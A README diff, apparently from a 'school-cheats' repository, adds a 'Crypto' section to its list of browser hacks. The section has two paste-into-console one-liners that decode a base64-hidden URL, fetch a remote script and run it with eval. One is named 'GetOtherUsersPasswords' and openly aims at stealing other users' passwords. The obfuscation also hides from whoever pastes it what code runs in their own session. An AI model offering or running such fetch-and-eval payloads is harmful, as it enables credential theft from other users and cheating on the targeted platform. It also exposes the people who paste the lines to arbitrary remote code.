@@ -69,5 +69,21 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2Fk
 ```
 
 
+## Crypto
+
+
+
+## <a id="GetCrypto"></a>GetCrypto.js
+
+Open Console (ctrl + shift + j) and past the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NyeXB0b0dldENyeXB0by5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
+## <a id="GetOtherUsersPasswords"></a>GetOtherUsersPasswords.js
+
+Open Console (ctrl + shift + j) and past the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2NyeXB0b0hhY2tQYXNzd29yZHMuanM=')).then((res) => res.text().then((t) => eval(t)))
+```
 
 ## More hacks are coming soon if someone coments on this with more working hacks i will add them
